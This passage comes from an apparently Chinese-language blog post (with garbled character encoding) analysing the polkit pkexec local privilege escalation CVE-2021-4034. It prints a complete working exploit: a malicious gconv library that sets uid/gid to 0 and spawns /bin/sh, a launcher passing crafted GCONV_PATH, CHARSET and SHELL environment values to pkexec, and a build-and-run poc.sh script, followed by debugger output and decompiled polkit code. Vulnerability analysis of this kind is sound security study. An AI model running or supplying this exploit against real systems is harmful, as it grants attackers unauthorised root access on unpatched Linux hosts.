‡ä¾æ¬¡éå†<br>\nè¿™å°±æ˜¯ shellcode äº†<br>\nå…³äºè¿™ä¸ª <code>setuid</code>  å’Œ <code>setgid</code>  æˆ‘é‡æ–°å¼€ä¸€ç« åˆ†æ</p>\n<h2 id=\"å°¾å£°\"><a class=\"markdownIt-Anchor\" href=\"#å°¾å£°\">#</a> å°¾å£°</h2>\n<p>æ—¢ç„¶è‡ªå·±åˆ†æå®Œäº†ï¼Œå°±è¦è‡ªå·±å†™åˆ©ç”¨è„šæœ¬<br>\né¦–å…ˆæ˜¯æ¶æ„åº“</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> envp[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>],args,envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œç”¨ <code>args</code>  çš„ç›®çš„å°±æ˜¯ä¸ºäº†è¯­å¥å¤ç”¨ï¼Œæ²¡å•¥ç‰¹åˆ«å«ä¹‰ï¼Œä¹Ÿèƒ½æ‹†æˆ <code>/bin/sh</code> + <code>argv</code> <br>\npkexec æ‰§è¡Œçš„ææƒ</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> **argv)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> environ[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;evilib.so:.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;SHELL=/are/you/kid/me&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;CHARSET=HACK&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(<span class=\"string\">&quot;/usr/bin/pkexec&quot;</span>,args,environ);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://poc.sh\">poc.sh</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o exp exp.c</span><br><span class=\"line\">mkdir GCONV_PATH=.</span><br><span class=\"line\">gcc -fPIC -shared -o ./evilib.so evilib.c</span><br><span class=\"line\">echo &quot;module UTF-8// HACK// evilib 1&quot; &gt; gconv-modules</span><br><span class=\"line\">cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.</span><br><span class=\"line\">./exp</span><br></pre></td></tr></table></figure>\n<h2 id=\"è¡¥å……è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#è¡¥å……è°ƒè¯•\">#</a> è¡¥å……è°ƒè¯•</h2>\n<p><a href=\"https://hub.docker.com/r/chenaotian/cve-2021-4034\">https://hub.docker.com/r/chenaotian/cve-2021-4034</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">catch exec</span><br><span class=\"line\">r</span><br><span class=\"line\">b *$rebase(0x2380)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png\" alt=\"image\"></p>\n<p>ä¸¤æ¬¡ç»“æœå¯¹æ¯”</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">02:0010â”‚     0x7fffa507a720 â€”â–¸ 0x7fffa507bfad â—‚â€” &#x27;pwnkitdir&#x27;</span><br><span class=\"line\">03:0018â”‚     0x7fffa507a728 â€”â–¸ 0x7fffa507bfb7 â—‚â€” &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">04:0020â”‚     0x7fffa507a730 â€”â–¸ 0x7fffa507bfc9 â—‚â€” &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">05:0028â”‚     0x7fffa507a738 â€”â–¸ 0x7fffa507bfd8 â—‚â€” &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00:0000â”‚ rax 0x7fffa507a720 â€”â–¸ 0x55b966a37f50 â—‚â€” &#x27;GCONV_PATH=./pwnkitdir&#x27;</span><br><span class=\"line\">01:0008â”‚     0x7fffa507a728 â€”â–¸ 0x7fffa507bfb7 â—‚â€” &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">02:0010â”‚     0x7fffa507a730 â€”â–¸ 0x7fffa507bfc9 â—‚â€” &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">03:0018â”‚     0x7fffa507a738 â€”â–¸ 0x7fffa507bfd8 â—‚â€” &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<p>ida å®¡è®¡åˆ°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> ( *v19 != <span class=\"string\">&#x27;/&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    program_in_path = g_find_program_in_path(v19);</span><br><span class=\"line\">    v21 = program_in_path;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( program_in_path )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v22 = v7;</span><br><span class=\"line\">      v7 = (gchar *)program_in_path;</span><br><span class=\"line\">      g_free(v22);</span><br><span class=\"line\">      *(_QWORD *)opt_usera = v21; &lt;&lt;--------------------- argv[n] = path = s;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_34;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v38 = v7;</span><br><span class=\"line\">    v37 = strerror(<span class=\"number\">2</span>);</span><br><span class=\"line\">    v36 = <span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>;</span><br><span class=\"line\">LABEL_55:</span><br><span class=\"line\">    v8 = <span class=\"number\">127</span>;</span><br></pre></td></tr></table></figure>\n<p>æ ¹æ®å­—ç¬¦ä¸²å®šä½åˆ°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(type, <span class=\"string\">&quot;SHELL&quot;</span>) )<span class=\"comment\">// è·å–åˆ°SHELLçš„ç¯å¢ƒå˜é‡</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v151 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        v152[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v28 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          v29 = g_strsplit(v151, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0LL</span>);<span class=\"comment\">//shells</span></span><br><span class=\"line\">          <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">          &#123;<span class=\"comment\">// å¦‚æœç»ˆæ­¢æ¡ä»¶æ»¡è¶³</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !v29 || (v30 = *(_QWORD *)(v29 + <span class=\"number\">8LL</span> * v28)) == <span class=\"number\">0</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v31 = v29;</span><br><span class=\"line\">              v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">              v7 = local_agent_handle;</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_47;<span class=\"comment\">// ç›´æ¥è·³è¿‡å»</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(v27, v30) )</span><br><span class=\"line\">              <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            ++v28;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          g_free(v151);</span><br><span class=\"line\">          g_strfreev(v29);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_58;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">        v7 = local_agent_handle;</span><br><span class=\"line\">        v31 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        g_printerr(<span class=\"string\">&quot;Error getting contents of /etc/shells: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(v152[<span class=\"number\">0</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        g_error_free(v152[<span class=\"number\">0</span>]);</span><br><span class=\"line\">LABEL_47:</span><br><span class=\"line\">        g_free(v151);</span><br><span class=\"line\">        g_strfreev(v31);</span><br><span class=\"line\">        log_message(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">LABEL_48:</span><br><span class=\"line\">        v32 = <span class=\"string\">&quot;\\nThis incident has been reported.\\n&quot;</span>;</span><br><span class=\"line\">LABEL_49:</span><br><span class=\"line\">        v8 = <span class=\"number\">127</span>;</span><br><span class=\"line\">        g_printerr(v32);</span><br><span class=\"line\">        g_free(<span class=\"number\">0LL</span>);</span><br></pre></td></tr></table></figure>\n<p><code>v28</code>  æ˜¯ idxï¼Œå¯ä»¥å¾—çŸ¥è¿™æ˜¯ä¸ªæ•°ç»„<br>\nåé¦ˆåˆ°æºç </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shells = g_strsplit (contents, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        ret = TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>åœ¨åé¢è°ƒç”¨äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"comment\">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class=\"line\"><span class=\"comment\">       * environment variable passed through - this is to attempt to avoid</span></span><br><span class=\"line\"><span class=\"comment\">       * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!validate_environment_variable (key, value))</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">ç„¶åé‡Œé¢åˆè°ƒç”¨äº†---------------------------------------------------</span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_strcmp0 (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!is_valid_shell (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          log_message (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found in the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          g_printerr (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">-----------------------------------------------------------------------</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          ret = TRUE;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  g_free (contents);</span><br><span class=\"line\">  g_strfreev (shells);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "User state"
            ]
        }
    ]
}